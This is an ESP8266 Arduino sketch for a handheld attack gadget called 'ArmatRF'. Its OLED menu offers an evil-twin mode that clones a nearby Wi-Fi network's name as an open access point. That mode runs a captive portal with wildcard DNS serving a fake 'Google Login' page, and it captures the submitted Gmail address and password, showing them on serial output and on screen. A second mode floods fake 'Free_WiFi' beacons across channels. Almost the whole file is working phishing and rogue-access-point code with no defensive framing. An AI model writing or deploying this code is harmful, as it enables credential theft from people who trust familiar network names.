#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_ADDR 0x3C

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire);
ESP8266WebServer server(80);
DNSServer dnsServer;

String selectedSSID = "";
String capturedGmail = "";
String capturedPassword = "";

const int Dzax = D5;
const int Enter = D4;
const int Aj = D3;
int dzax = HIGH;
int enter = HIGH;
int aj = HIGH;
int prevDzax = HIGH;
int prevEnter = HIGH;
int prevAj = HIGH;
int i = 0;
bool wifibajin = true;

String menyu[4] = {"WiFi-Clon", "BLE", "WiFi-Spam", "Settings"};

void startPhishingPage() {
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", []() {
    server.send(200, "text/html",
      "<html><body><center><h2>Google Login</h2>"
      "<form action='/login' method='post'>"
      "Gmail: <input name='gmail' type='text'><br>"
      "Password: <input name='password' type='password'><br>"
      "<input type='submit' value='Login'>"
      "</form></center></body></html>");
  });

  server.on("/login", HTTP_POST, []() {
    capturedGmail = server.arg("gmail");
    capturedPassword = server.arg("password");

    server.send(200, "text/html", "<h2>Thanks! You are logged in.</h2>");

    Serial.println("Gmail: " + capturedGmail);
    Serial.println("Password: " + capturedPassword);

    display.clearDisplay();
    display.setCursor(0, 0);
    display.setTextSize(1);
    display.println("Captured:");
    display.println(capturedGmail);
    display.println(capturedPassword);
    display.display();
  });

  // Captive Portal redirect
  server.onNotFound([]() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });

  server.begin();
}

void Clon() {
  int numNetworks = WiFi.scanNetworks();
  int selected = 0;
  int dzax, aj, enter;
  int prevDzax = HIGH, prevAj = HIGH, prevEnter = HIGH;

  while (true) {
    dzax = digitalRead(Dzax);
    aj = digitalRead(Aj);
    enter = digitalRead(Enter);

    if (dzax == LOW && prevDzax == HIGH) selected++;
    if (aj == LOW && prevAj == HIGH) selected--;

    if (selected < 0) selected = numNetworks - 1;
    if (selected >= numNetworks) selected = 0;

    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(0, 0);
    display.println("WiFi Networks:");

    for (int i = 0; i < numNetworks && i < 4; i++) {
      display.setCursor(0, 12 + i * 12);
      if (i == selected) display.print("> ");
      else display.print("  ");
      display.println(WiFi.SSID(i));
    }

    display.display();

    if (enter == LOW && prevEnter == HIGH) {
      selectedSSID = WiFi.SSID(selected);
      Serial.println("Cloning: " + selectedSSID);

      WiFi.mode(WIFI_AP);
      WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
      WiFi.softAP(selectedSSID.c_str());

      startPhishingPage();

      display.clearDisplay();
      display.setCursor(0, 0);
      display.println("Cloned SSID:");
      display.println(selectedSSID);

      display.print("RSSI: ");
      display.println(WiFi.RSSI(selected));

      display.print("CH: ");
      display.println(WiFi.channel(selected));

      display.print("Enc: ");
      int enc = WiFi.encryptionType(selected);
      switch (enc) {
        case ENC_TYPE_NONE: display.println("Open"); break;
        case ENC_TYPE_WEP: display.println("WEP"); break;
        case ENC_TYPE_TKIP: display.println("WPA"); break;
        case ENC_TYPE_CCMP: display.println("WPA2"); break;
        case ENC_TYPE_AUTO: display.println("Auto"); break;
        default: display.println("Unknown"); break;
      }

      display.println();
      display.println("Press ENTER to stop");
      display.display();

      while (true) {
        int waitEnter = digitalRead(Enter);
        if (waitEnter == LOW) {
          delay(300);
          WiFi.softAPdisconnect(true);
          dnsServer.stop();
          server.stop();
          WiFi.mode(WIFI_STA);
          WiFi.disconnect();
          break;
        }
        dnsServer.processNextRequest();
        server.handleClient();
        delay(10);
      }
    }

    delay(150);
    prevDzax = dzax;
    prevAj = aj;
    prevEnter = enter;
  }

  WiFi.scanDelete();
}

void spamWiFi() {
  WiFi.mode(WIFI_AP);
  int channel = 1;

  while (true) {
    String fakeSSID = "Free_WiFi_" + String(random(1000, 9999));

    WiFi.softAP(fakeSSID.c_str(), "", channel);

    display.clearDisplay();
    display.setCursor(0, 0);
    display.setTextSize(1);
    display.println("Spamming:");
    display.println(fakeSSID);
    display.println("Press ENTER to stop");
    display.display();

    Serial.println("Spammed: " + fakeSSID);

    delay(300);
    WiFi.softAPdisconnect(true);

    channel++;
    if (channel > 13) channel = 1;

    int waitEnter = digitalRead(Enter);
    if (waitEnter == LOW) {
      delay(300);
      WiFi.softAPdisconnect(true);
      WiFi.mode(WIFI_STA);
      break;
    }
  }

  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("Spam stopped");
  display.display();
  delay(1500);
}

void setup() {
  pinMode(Dzax, INPUT_PULLUP);
  pinMode(Aj, INPUT_PULLUP);
  pinMode(Enter, INPUT_PULLUP);
  Serial.begin(9600);

  if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
    Serial.println(F("SSD1306 չի գտնվել"));
    while (true);
  }

  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(WHITE);
  display.setCursor(20, 20);
  display.println("ArmatRF");
  display.display();
  delay(1000);

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(20, 0);
  display.println("==ArmatRF Menu==");

  for (int j = 0; j < 4; j++) {
    display.setCursor(10, 16 + j * 16);
    if (j == i) display.print("> ");
    else display.print("  ");
    display.println(menyu[j]);
  }

  display.display();
}

void loop() {
  dzax = digitalRead(Dzax);
  enter = digitalRead(Enter);
  aj = digitalRead(Aj);

  if (dzax == LOW && prevDzax == HIGH && wifibajin == true) i++;
  if (aj == LOW && prevAj == HIGH && wifibajin == true) i--;

  if (i == 4) i = 0;
  if (i == -1) i = 3;

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(20, 0);
  display.println("==ArmatRF Menu==");

  if (wifibajin == true) {
    for (int j = 0; j < 4; j++) {
      display.setCursor(10, 14 + j * 14);
      if (j == i) display.print("> ");
      else display.print("  ");
      display.println(menyu[j]);
    }

    if (i == 0 && enter == LOW && prevEnter == HIGH) {
      wifibajin = false;
      WiFi.mode(WIFI_STA);
      WiFi.disconnect();
      delay(100);
      Clon();
      wifibajin = true;
    }

    if (i == 2 && enter == LOW && prevEnter == HIGH) {
      wifibajin = false;
      spamWiFi();
      wifibajin = true;
    }

    display.display();
  }

  delay(200);
  prevAj = aj;
  prevDzax = dzax;
  prevEnter = enter;
}
